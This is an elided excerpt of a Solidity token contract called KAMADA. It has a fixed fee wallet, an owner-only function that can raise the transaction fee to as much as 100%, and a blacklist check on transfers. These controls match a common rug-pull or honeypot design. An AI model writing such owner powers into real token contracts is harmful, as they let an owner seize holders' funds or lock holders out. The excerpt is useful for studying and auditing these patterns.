...
contract Kamada is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private constant _name = "DAICHI KAMADA";
    string private constant _symbol = "KAMADA";
    uint8 private constant _decimals = 18;

    uint256 public _transactionFee = 4;
    address public constant _feeWallet =
        0x420948DCfb545C05B56A9ca8133C3A034E115A21;
    ...
    function setFeePercentage(uint256 transactionFee) external onlyOwner {
        require(transactionFee <= 100);
    ...
    function _beforeTokenTransfer(address from, address to) internal virtual {
        require(
            ...
            "Transfer from or to blacklisted address"
        );
    }
